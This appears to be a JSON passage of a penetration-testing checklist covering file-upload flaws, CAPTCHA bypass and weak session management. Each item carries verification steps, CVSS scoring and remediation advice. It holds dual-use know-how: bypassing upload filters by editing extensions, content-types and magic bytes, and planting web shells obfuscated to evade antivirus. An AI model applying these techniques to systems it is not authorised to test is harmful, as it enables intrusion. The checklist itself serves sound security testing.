						"instructions": "<h3>Instructions:</h3><p>If upload is allowed, attempt to <u>overwrite</u> the file of another user (e.g., use the same file name between users with different data). If it's possible to overwrite, this is more serious and see the Verification Instructions below.</p><p>If you can confirm this is uploaded to a portion of the file system that could lead to a DoS, this is more serious too and the CVSS should include a score for Availability (A:L) which will increase the overall severity. </p><h3>Comment:</h3><p>To better document various tasks (similar to a Test Plan), include a comment that reflects test cases, unique injection payloads, business logic bypass attempts, and attack paths.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": true,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17054637,
							"uid": "e5eec5b9-3485-e411-9c10-001e4f12001c",
							"name": "File Upload - Unvalidated File Allowed",
							"description": "<p>The application allows users to upload arbitrary files.</p>",
							"severityId": 1,
							"businessImpact": "<p>Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server. Depending on whether the file path, file extension and file content are controllable or not, attackers may be able to:</p><ul><li><p>Upload web forms to the web directories to gain remote code execution.</p></li><li><p>Upload malware/virus to web directories to attack other users.</p></li><li><p>Upload large file to cause Denial-of-Service condition.</p></li><li><p>Overwrite critical system files, cause Denial-of-Service, backdoor system, or gain remote access through other means.</p></li></ul>",
							"sourceIdentifier": "M:e5eec5b9-3485-e411-9c10-001e4f12001c",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Attempt to upload arbitrary files, such as ipconfig.exe, to the server. Attempt to bypass any client-side or server-side controls that are used to restrict upload capabilities:</p><ul><li><p>modify file extension in Burp</p></li><li><p>modify file content-type in Burp</p></li></ul><p><strong>Reporting Requirements</strong></p><ol><li><p>Add description to detail what kind of files are allowed to be uploaded</p></li><li><p>Show file upload functionality</p></li><li><p>Show upload of an arbitrary file</p></li><li><p>If necessary, show request content modification in Burp</p></li><li><p>Show that the uploaded file is accessible on the server</p></li><ol><li><p>Ideally download the file showing that the upload was successful</p></li></ol></ol><p><strong>CVSS Deviations</strong></p><ol><li><p>Upload <strong>with authentication</strong>. </p></li><ol><li><p><strong>(Default Score) Can't</strong> overwrite files or execute code or cause other significant impact: </p></li><ol><li><p>3.5 - LOW - CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N</p></li></ol><li><p><strong>Can</strong> overwrite files or execute code or cause other significant impact: </p></li><ol><li><p>6.5 - MED - CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N</p></li></ol></ol><li><p>Upload <strong>without authentication</strong></p></li><ol><li><p><strong>Can't</strong> overwrite files or execute code or cause other significant impact: </p></li><ol><li><p>4.3 - MED - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N</p></li></ol><li><p><strong>Can</strong> overwrite files or execute code or cause other significant impact: </p></li><ol><li><p>6.5 - MED - CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N</p></li></ol></ol></ol><p>Adjust CVSS as appropriate. For example, if user interaction (UI) is not required via something like command execution set UI as None and adjust the severity appropriately.</p>",
							"references": "<ul><li>https://www.owasp.org/index.php/Unrestricted_File_Upload</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that server-side controls are put into place that validate and restrict uploaded file extensions, locations, and content to only that which is required for a defined business purpose.</p><p>Follow these recommendations to secure file upload functionality:</p><ul><li><p>Check file extension</p></li><li><p>Reject special characters in file names such as &quot;/&quot; and &quot;;&quot;</p></li><li><p>Rename user uploaded content, and add the expected file extension</p></li><li><p>When possible, check file signatures for binary files (such as image or PDF files)</p></li><li><p>When expected file upload is an image, render the content when accessed, for example by using &lt;img&gt; tags</p></li><li><p>For arbitrary files (such as executables) that can be uploaded and accessed, serve the files with &quot;Content-Disposition: attachment&quot; header instead of rendering the file</p></li><li><p>If uploaded content saved as files instead of saving into a database, save uploaded content outside of webroot; do not allow direct access to uploaded files via the application</p></li><li><p>Do not allow execution from upload folder</p></li><li><p>Limit file sizes</p></li><li><p>If compressed file uploads are extracted on the server, apply these directions to each file one by one</p></li></ul>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "705cebab-f1ec-4bbd-ba8e-5b4b7fcbc5bd",
						"name": "File Upload - OS Command Execution",
						"instructions": "<p>To better document various tasks (similar to a Test Plan), include a comment that reflects test cases, unique injection payloads, business logic bypass attempts, and attack paths.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17054413,
							"uid": "767f1d74-e75d-e411-8e01-001e4f12001c",
							"name": "File Upload - OS Command Execution",
							"description": "<p>The application allows user to upload arbitrary files, including files with malicious content.</p>",
							"severityId": 4,
							"businessImpact": "<p>Permitting users to upload files can allow attackers to inject dangerous content or malicious code to run on the server. Depending on whether file path, file extension and file content are controllable or not, attackers may be able to:</p><ul><li><p>Upload web forms to the web directories to gain remote code execution.</p></li><li><p>Upload malware/virus to web directories to attack other users.</p></li><li><p>Upload large file to cause Denial-of-Service condition.</p></li><li><p>Overwrite critical system files, cause Denial-of-Service, backdoor system or gain remote access through other means.</p></li></ul>",
							"sourceIdentifier": "M:767f1d74-e75d-e411-8e01-001e4f12001c",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Attempt to upload arbitrary files to the server. Attempt to bypass any client-side or server-side controls that are used to restrict upload capabilities:</p><ul><li><p>modify file extension in Burp</p></li><li><p>modify file content-type in Burp</p></li><li><p>upload valid file but include malicious content in the file (for example to match PNG file signature)</p></li></ul><p>Determine what kind of web technology is in use (php, aspx, etc.). Try to determine if the file is uploaded to the web server file system and if it's accessible directly (like https://webserver/files/cmd.php). If the file can be accessed directly, test whether it's executed server-side or if it's just returned to user without execution.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add description to detail what kind of files are allowed to be uploaded</p></li><li><p>Show file upload functionality</p></li><li><p>Show upload of an arbitrary file</p></li><li><p>If necessary, show request content modification in Burp</p></li><li><p>Show that the uploaded file is accessible on the server</p></li><li><p>Show OS command execution and other access within the application environment</p></li></ol><p><strong>Further Testing</strong></p><p>OS command execution can be used to identify loads of other vulnerabilities.</p><p><strong>Tools</strong></p><ul><li><p>obfuscated (to avoid AV detection) fuzzdb web shells available on repo</p></li><li><p>fuzzdb - for web shell for different platforms</p></li><li><p>sqlcmd.aspx - for DB connectivity</p></li></ul>",
							"references": "<ul><li>https://www.owasp.org/index.php/Unrestricted_File_Upload</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that server-side controls are put into place that validate and restrict uploaded file extensions, locations, and content to only that which is required for a defined business purpose.</p><p>Follow these recommendations to secure file upload functionality:</p><ul><li><p>Check file extension</p></li><li><p>Reject special characters in file names such as &quot;/&quot; and &quot;;&quot;</p></li><li><p>Rename user uploaded content, and add the expected file extension</p></li><li><p>When possible, check file signatures for binary files (such as image or PDF files)</p></li><li><p>When expected file upload is an image, render the content when accessed, for example by using <code>&lt;img&gt;</code> tags</p></li><li><p>For arbitrary files (such as executables) that can be uploaded and accessed, serve the files with the &quot;Content-Disposition: attachment&quot; header instead of rendering the file</p></li><li><p>If uploaded content saved as files instead of saving into a database, save uploaded content outside of webroot; don't allow direct access to uploaded files via the application</p></li><li><p>Don't allow execution from upload folder</p></li><li><p>Limit file sizes</p></li><li><p>Use anti-virus when possible to scan uploaded content</p></li><li><p>If compressed file uploads are extracted on the server, apply these directions to each file one by one</p></li></ul>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "7dc934e0-2a51-438a-8b78-8a15beabd065",
						"name": "File Upload - Cross-Site Scripting",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 17064840,
							"uid": "aea31dd7-c749-e911-810e-ecf4bbd04083",
							"name": "File Upload - Cross-Site Scripting",
							"description": "<p>The application allows users to upload files which can be exploited to execute Cross-Site Scripting (XSS) attacks against users of the application. These types of files include, but are not limited to: HTML, SHTML, SWF,  HTM, XHTML, and SVG.</p>",
							"severityId": 3,
							"businessImpact": "<p>Permitting users to upload files can potentially allow attackers to execute cross-site scripting attacks when the affected file is viewed within the browser/application. Successful exploitation of cross-site scripting vulnerabilities allows an attacker to run arbitrary script code in the context of the affected user. This can be used to compromise the integrity of content returned by the web server to take over a user's session, redirect the user to a malicious web site, or send requests on behalf of a user. Stolen sessions can be used to take any action the affected user could within an application.  Redirecting users to malicious web sites could be used to propagate malware, discredit the original web site, or trick users into disclosing sensitive information. Sending malicious requests on behalf of an affected user can make it difficult to discover the true origin of the attack.</p>",
							"sourceIdentifier": "M:f683bcf6-93b0-437a-82fd-3dc8d95a8e90",
							"verificationInstructions": "<p>If in doubt about if you should raise this, please read this thread: <a href='https://netspi.slack.com/archives/C05C5J0PLV9/p1708448250521799?thread_ts=1708085889.400919&cid=C05C5J0PLV9'>https://netspi.slack.com/archives/C05C5J0PLV9/p1708448250521799?thread_ts=1708085889.400919&amp;cid=C05C5J0PLV9</a></p><h3></h3><h3>Verification Instructions:</h3><p>Attempt to upload JS-executing files, such as xss.html, xss.js, xss.svg, to the server. Attempt to bypass any client-side or server-side controls that are used to restrict upload capabilities:</p><ul><li><p>modify file extension in Burp</p></li><li><p>modify file content-type in Burp</p></li><li><p>modify magic bytes in Burp</p></li></ul><p>If the application doesn't allow files that execute JS in the browser, pay attention to how the application sets the Content-Type response header on the filetypes that are allowed. The absence of the header could yield JS execution in the browser.</p><h3>Reporting Requirements:</h3><ol><li><p>Add description to detail what kind of files are allowed to be uploaded</p></li><li><p>Show file upload functionality</p></li><li><p>Show upload of the file</p></li><li><p>If necessary, show request content modification in Burp</p></li><li><p>Show that the uploaded file is accessible on the server and that the JavaScript executes in the browser.</p></li></ol><p>Per https://netspi.slack.com/archives/C05C5J0PLV9/p1705691226984739?thread_ts=1704917008.229909&amp;cid=C05C5J0PLV9</p><p>When reporting this finding, you must also report <strong>File Upload - Unvalidated File Allowed</strong></p><p>If a client does push back because much of the remediation does overlap between the two (and they clearly understand that it's possible to fix one without fixing the other), the UFU finding (Medium) would be removed and the FUXSS (High) will remain in the report.</p>",
							"references": "",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that server-side controls are put into place that validate and restrict uploaded file extensions, locations, and content to only that which is required for a defined business purpose.</p><p>Follow these recommendations to secure file upload functionality:</p><ul><li><p>Reject special characters in file names such as &quot;/&quot; and &quot;;&quot;</p></li><li><p>Check/validate file extension</p></li><li><p>Rename user uploaded content, and add the expected file extension</p></li><li><p>When possible, check file signatures for binary files (such as image or PDF files)</p></li><li><p>When expected file upload is an image, render the content when accessed, for example by using &lt;img&gt; tags</p></li><li><p>For arbitrary files that can be uploaded and accessed, serve the files with &quot;Content-Disposition: attachment&quot; header instead of rendering the file</p></li><li><p>Don't allow execution from upload folder</p></li><li><p>Limit file sizes</p></li><li><p>Use anti-virus when possible to scan uploaded content.</p></li><li><p>If compressed file uploads are extracted on the server, apply these directions to each file one by one</p></li></ul><p>When allowing a user to view the file, return it with a Content-Type header of text/plain with the X-Content-Type-Options header set to &quot;nosniff&quot; (not available in Safari). Additionally, a Content-Security-Policy (CSP) can be utilized to prevent inline scripts from being loaded by leaving out the 'unsafe-inline' instruction from the 'script-src' directive.</p><p>If the user can download the file, send the document as an attachment with &quot;Content-Disposition: attachment&quot; header instead of rendering the file, and require the user to open it outside of the application's domain. If a subset of file extensions are needed for upload, set up an allow list and deny all files that do not conform.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "f6d806b3-1078-4b78-99bf-855363b2d46c",
						"name": "File Upload - Processed Files",
						"instructions": "<h3>Instructions:</h3><p>If the application appears to process uploaded files, for example by extracting data from an Excel spreadsheet, attempt filetype specific injections.</p><p>The Burp Upload Scanner extension can be used to test injections inside files. </p><p><strong>Note: </strong>Upload Scanner does upload thousands of files if the default settings are used. To avoid causing issues during the testing, Upload Scanner should be limited to certain filetypes and it should be ran only when upload processing can be expected. For example, a file store that accepts any types of files is unlikely to process the uploaded files.</p><h3>Reporting:</h3><p>If identified, add an appropriate finding, such as &quot;Vulnerable Version - XYZ&quot;, &quot;Server-Side Request Forgery&quot;, etc.</p><p>--- add references to specific instructions --- </p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "841cc29c-ba03-4255-9c1d-519ecdfb4bbe",
						"name": "File Upload - Clean Up",
						"instructions": "<p>If malicious files are successfully uploaded and executed during the testing (typically web shells), ensure that the files are removed from the application at the end of the test.</p><p>If the files cannot be removed, ensure that the client is notified to remove the files.</p>",
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": null,
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "2dc47667-b5b6-4526-b42f-d161741a4bb3",
						"name": "CAPTCHA - Application Logic Error",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 3609771,
							"uid": "905a9100-4191-e011-b27a-001e4f120021",
							"name": "CAPTCHA - Application Logic Error",
							"description": "<p>CAPTCHAs are intended to prevent the automated submission of forms and enumeration of data.  The application requires users to enter a CAPTCHA value on multiple forms, but it is possible to bypass the CAPTCHA requirement due to application weaknesses.</p>",
							"severityId": 2,
							"businessImpact": "<p>The protections against automated attacks that the CAPTCHA provides may be circumvented.</p>",
							"sourceIdentifier": "M:3609771",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determine how the application implements captchas. Implementation weaknesses can include:</p><ul><li><p>static CAPTCHA value</p></li><li><p>valid CAPTCHA value in server response</p></li></ul><p><strong>Reporting Requirements</strong></p><ol><li><p>Add an explanation how CAPTCHAs are implemented and how the implementation can be bypassed</p></li><li><p>Add screenshot showing CAPTCHA validation bypass</p></li></ol>",
							"references": "<ul><li>https://www.owasp.org/index.php/Testing_for_Captcha_(OWASP-AT-012)</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that the CAPTCHA value is verified prior to processing other form data.</p>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					}
				],
				"ordinal": 9,
				"collapsed": true
			},
			{
				"uid": "0c432999-e8b1-493f-8946-9df1b99bce6f",
				"name": "Broken Authentication",
				"description": null,
				"type": 2,
				"tasks": [
					{
						"uid": "31f75403-b665-4637-a696-c76635556660",
						"name": "Weak Session Management - Session Fixation",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21616,
							"uid": "d394dd75-33db-dd11-8f72-001e4f120030",
							"name": "Weak Session Management - Session Fixation",
							"description": "<p>Authenticating a user without invalidating any existing session identifier gives an attacker the opportunity to steal authenticated sessions. If an attacker can force a user to authenticate with a known session ID, once the user is authenticated, the attacker can use the known session ID to perform session hijacking by manipulating their own session ID to match the known session ID of the user.</p><p>This vulnerability is most commonly exploited in the following ways:</p><ul><li><p>The attacker visits the application on a shared workstation, records the session ID, waits for a user to logon at the same workstation, then uses the known session ID to steal the user's session</p></li><li><p>The application sets a session ID on a page sent over HTTP, the attacker observes and records the session ID as it travels over an unencrypted channel, the user is redirected to an HTTPS login page with the same session ID and logs in, then the attacker uses the known session ID to steal the user's session</p></li><li><p>The application determines the session ID's value based off user input, the attacker causes the user's input to create a session ID of the attacker's choice, the user logs in, then the attacker uses the known session ID to steal the user's session</p></li></ul>",
							"severityId": 1,
							"businessImpact": "<p>Session fixation vulnerabilities facilitate session hijacking attacks, which allow an attacker to take actions in the context of the user whose session was stolen. The severity of this issue depends on the level of access the user has within the application, as well as the nature of the application itself.</p>",
							"sourceIdentifier": "M:21617",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Option 1:</p><p>Access the web server and determine what the session cookie(s) is. Determine whether the session cookie is set prior to authentication and not reset upon successful authentication.</p><p>Option 2:</p><p>Test if session cookie can be set for other users. For example, setting the cookie's value via a URL parameter:</p><p>https://webserver/app?JSESSIONID=1234ASDF123ASD</p><p>If so, check if the cookie is reset upon successful authentication.</p><p>If so, change the CVSS Attack Vector from &quot;Local&quot; to &quot;Network&quot;, which raises the severity of the issue.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show HTTP response that sets the session cookie</p></li><li><p>Show authentication request and response that does not reset the session cookie</p></li></ol><p><strong>References</strong></p><ul><li><p>http://www.owasp.org/index.php/Testing_for_Session_Fixation_%28OWASP-SM-003%29</p></li><li><p>http://shiflett.org/articles/session-fixation</p></li></ul>",
							"references": "<ul><li>https://www.owasp.org/index.php/Testing_for_Session_Fixation_%28OWASP-SM-003%29</li><li>https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that existing session IDs are never reused. When a user logs in, use the following session management process to prevent session fixation attacks:</p><ul><li><p>Obtain and invalidate the previous session ID from the user's HTTP request, regardless of whether the user is already logged in.</p></li><li><p>Generate a new, non-predictable session ID and assign it to the user.</p></li></ul>"
						},
						"ordinal": 0,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "05ee71ba-3102-4a43-8f57-7fc2f1138d25",
						"name": "Weak Session Management - Insufficient Session Expiration",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21397,
							"uid": "e814adc8-c5c0-dd11-b9f5-001e4f120030",
							"name": "Weak Session Management - Insufficient Session Expiration",
							"description": "<p>The application has insufficient session expiration. Proper session expiration ensures that if a user does not log out properly or leaves their computer unattended while they are logged in, their session will expire after a certain period of inactivity. Sliding expiration resets the expiration time for a valid authentication cookie if a request is made and more than half of the timeout interval has elapsed.</p><p>Since HTTP is a stateless protocol, web sites commonly use session IDs to uniquely identify a user from request to request. Consequently, each session ID's confidentiality must be maintained to prevent unauthorized account access. A stolen session ID can be used to view another user's account or perform actions within the context of that user.</p>",
							"severityId": 1,
							"businessImpact": "<p>In conjunction with other vulnerabilities, insufficient session expiration increases a web site's exposure to session theft attacks. Were an attacker to steal a user's session, they would be able to take any action in the application within the context of the user whose session was stolen.</p>",
							"sourceIdentifier": "M:21398",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Leave an authenticated session idle for 30 minutes to determine if sessions will time out.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Add a description that states that the session did not expire after xx minutes of inactivity</p></li><li><p>If idle sessions stay active for more than 8 hours, increase the finding severity for the project</p></li><li><p>If the application handles highly sensitive data (like HIPAA, bank account info, etc.) or gives access to administrative functionality (such as user management), increase the finding severity for the project</p></li></ol><p>Note: if both 2 and 3 of the above conditions are true, only raise the severity once. So if the finding is low, move to medium</p><p><strong>Note</strong></p><p>Session expiration should not be reported for applications that use stateless authentication (like JWT); rather, the finding should be reported as a token lifetime issue.</p>",
							"references": "<ul><li>https://wiki.owasp.org/index.php/Testing_for_Logout_and_Browser_Cache_Management_(OWASP-AT-007)</li><li>https://owasp.org/www-community/Session_Timeout</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that sessions expire on both the server and the client after an appropriate period of inactivity. A session time out period of fifteen minutes or less is recommended. Although short session expiration times do not help if a stolen session is immediately used, this control will prevent an attacker from continuously using the stolen session ID. If additional controls are in place, such as disallowing concurrent logins, the chance of session theft will be greatly reduced.</p>"
						},
						"ordinal": 1,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "48526f00-f1ce-41e3-ac0d-fd63fbcbec61",
						"name": "Weak Session Management - Insufficient Session Destruction",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 21395,
							"uid": "42990c08-fdbf-dd11-b9f5-001e4f120030",
							"name": "Weak Session Management - Insufficient Session Destruction",
							"description": "<p>The application does not properly destroy sessions on user logout or after a user resets their password. Proper session destruction on user logout or password reset ensures that the session ID cannot be replayed to gain access to a user's account after that user has logged out of the application or resets their password. Since HTTP is a stateless protocol, web sites commonly use session IDs to uniquely identify a user from request to request. Consequently, each session ID's confidentiality must be maintained in order to prevent multiple users from accessing the same account. A stolen session ID can be used to view another user's account or perform actions within the context of that user.</p>",
							"severityId": 1,
							"businessImpact": "<p>In conjunction with other vulnerabilities, insufficient session destruction increases a web site's exposure to session theft attacks.  An attacker could leverage this vulnerability to steal a user's session, which may allow the attacker to take any action in the application within the context of the user whose session was stolen.</p>",
							"sourceIdentifier": "M:21396",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Perform logout function. Repeat a request using the pre-logout session cookie value to determine if the cookie is invalidated on the server.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show session cookie value prior to logout</p></li><li><p>Show logout function</p></li><li><p>Show authenticated request using the old cookie value</p></li></ol><p>Note that this should not be reported if the session is tracked via JWT.</p>",
							"references": "<ul><li>http://www.owasp.org/index.php/Testing_for_Logout_and_Browser_Cache_Management_(OWASP-AT-007)</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that old sessions are destroyed on both the server and the client when a user logs out or resets their password. This will limit an attacker to only being able to steal the session of a user that is currently logged in. If additional controls are in place, such as disallowing concurrent logins, the chance of session theft will be reduced.</p>"
						},
						"ordinal": 2,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "eb3487e8-b5ef-4efc-a4b1-528eb09086c7",
						"name": "Weak Session Management - Logout Functionality Not Available",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5050388,
							"uid": "53306006-97f3-e111-8889-001e4f12001e",
							"name": "Weak Session Management - Logout Functionality Not Available",
							"description": "<p>No logout functionality is implemented in the application. Due to the missing logout function, it is not possible to properly end a user session; the session stays active even if the application or web browser is closed.</p>",
							"severityId": 1,
							"businessImpact": "<p>The lack of logout functionality leads to user sessions remaining active. An attacker could use stolen session identifiers to access active user sessions and perform actions within the privilege context of the compromised session.</p>",
							"sourceIdentifier": "M:cea5350c-99f0-e111-8dfc-402cf492712b",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Check if the application includes a logout button.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Screenshot a sample page (typically main page) that does not contain a logout button</p></li></ol>",
							"references": "<p><a target=\"_blank\" rel=\"noopener noreferrer nofollow\" href=\"https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html\">https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html</a></p>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Implement logout functionality within the application. A properly implemented logout function should remove the session identifiers from the client browser, as well as invalidate sessions on the server side.</p>"
						},
						"ordinal": 3,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "06557939-3536-4253-9880-d9cd09463197",
						"name": "Weak Session Management - Session ID in URL",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 22001,
							"uid": "debb0847-7af9-dd11-908d-001e4f12001c",
							"name": "Weak Session Management - Session ID in URL",
							"description": "<p>The session identifier is included in the URL as part of the GET request. This information will be stored in the browser history and will be available in the history after the browser is closed. This information may also be exposed in access and proxy logs.</p>",
							"severityId": 2,
							"businessImpact": "<p>Were an attacker to gain access to the session identifier, the attacker could take any action within the application in the context of the affected logged on user.</p>",
							"sourceIdentifier": "M:22001",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determine the session cookie(s) and try to identify requests that contain the session cookie as a GET parameter. The session id disclosed in the URL must be used to authenticate a user.   </p><p><strong>Reporting Requirements</strong></p><ol><li><p>Include the HTTP request/response pair that contains the session ID in URL - red-bold the session ID and the session cookie showing they are the same value.</p></li></ol>",
							"references": "<ul><li>https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Do not pass the session identifier or any other sensitive information in the URL.</p>"
						},
						"ordinal": 4,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "5dcac907-9f31-4fd5-a908-e98a839d6095",
						"name": "Weak Session Cookie - HTTPOnly not Set",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 837,
							"uid": "7436944e-03b1-dd11-992f-001e4f120030",
							"name": "Missing Cookie Flag - HTTPOnly",
							"description": "<p>One or more cookies were discovered that did not have the HTTPOnly flag set. This security feature helps mitigate the possibility of a successful cross-site scripting attack by not allowing cookies with the HTTPOnly attribute to be accessed through client-side scripts.</p>",
							"severityId": 1,
							"businessImpact": "<p>The lack of HTTPOnly cookies increases the risk of exposure or manipulation of sensitive cookie data through cross-site scripting attacks.  Cookie manipulation or exposure can allow an attacker to steal a user's session and gain access to their account.</p>",
							"sourceIdentifier": "GID:3237",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determine what the session cookies are for the application. Authenticate to the application and check for &quot;Set-Cookie:&quot; in the HTTP response. If the cookie does not contain the text &quot;HTTPOnly&quot;, then this finding is verified. </p><p><strong>Note: </strong>This is only necessary for session cookies or cookies that appear to contain some sensitive information. Do not report the absence of the 'HTTPOnly' attribute for Anti-CSRF cookie.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show login request and response - highlight the Set-Cookie header that does not set HTTPOnly for the session cookie</p></li></ol>",
							"references": "<ul><li>http://msdn.microsoft.com/en-us/library/ms533046.aspx</li><li>https://owasp.org/www-community/HttpOnly</li><li>https://docs.oracle.com/javaee/6/api/javax/servlet/http/Cookie.html&#35;setHttpOnly(boolean)</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that the HTTPOnly flag is set for all cookies that contain sensitive information. The HTTPOnly flag can be set either in application code or in the web server configurations. Refer to the application server or web server documentation for information on how to properly set the HTTPOnly flag.</p>"
						},
						"ordinal": 5,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "b92a0554-f00e-4fd1-802f-59e30f74dc94",
						"name": "Weak Session Cookie - Secure not Set",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 841,
							"uid": "7c36944e-03b1-dd11-992f-001e4f120030",
							"name": "Missing Cookie Flag - Secure",
							"description": "<p>A cookie was found that does not require the use of SSL for secure transmission. Any area of a website or web application that contains sensitive information or access to privileged functionality such as remote site administration should require that all cookies to be sent via SSL during a SSL session. If a cookie is marked secure, it will only be transmitted if the communications channel with the host is a secure one. If secure flag is not specified, a cookie is considered safe to be sent in the clear over unsecured channels.</p>",
							"severityId": 1,
							"businessImpact": "<p>If an application uses both HTTPS and HTTP, but does not set the secure flag, cookies set during an HTTPS request will also be sent during subsequent HTTP requests. Attackers can then compromise the cookie by sniffing the unencrypted network traffic.</p>",
							"sourceIdentifier": "GID:3186",
							"verificationInstructions": "<p><strong>Verification Instructions</strong></p><p>Determine what the session cookies are for the application. Authenticate to the application and check for \"Set-Cookie:\" in the HTTP response. If the cookie does not contain the text \"Secure\", then this finding is verified. </p><p>Note: This is only necessary for session cookies or cookies that appear to contain some sensitive information.</p><p>The following example shows the Set-Cookie header with the secure flag set:</p><p>Set-Cookie: NAME=VALUE; expires=DATE; path=PATH; domain=DOMAIN_NAME; secure </p><p>Secure flag cannot be used for HTTP applications. If Cleartext Protocol - HTTP is reported, this finding should be included but a note should be added to state that the client should ensure that Secure flag is set after the site has been switched over to HTTPS.</p><p><strong>Reporting Requirements</strong></p><ol><li><p>Show login request and response - highlight the Set-Cookie header that does not set Secure flag for the session cookie</p></li></ol>",
							"references": "<ul><li>https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes</li><li>http://technet.microsoft.com/en-us/library/cc771633%28v=ws.10%29</li><li>http://www.ietf.org/rfc/rfc2965.txt</li></ul>",
							"exploitInstructions": "",
							"remediationInstructions": "<p>Ensure that the secure flag is set for all cookies that contain sensitive information. The secure flag can be set either in application code or in the web server configurations. Refer to the application or web server documentation for more information on how to appropriately set the secure flag.</p>"
						},
						"ordinal": 6,
						"commentsCount": 0,
						"hasLinkedFinding": false
					},
					{
						"uid": "13503cd6-9918-4b45-ad60-eb918b8d01d7",
						"name": "Weak Session Cookie - Persistent Cookie",
						"instructions": null,
						"state": 1,
						"isTaskInstructionsVisible": true,
						"isCommentMandatory": false,
						"triggeredProjectChecklist": null,
						"findingTemplate": {
							"id": 5050221,
							"uid": "3101134a-30e3-e111-88b8-001e4f12001e",
							"name": "Weak Session Cookie - Persistent Cookie",
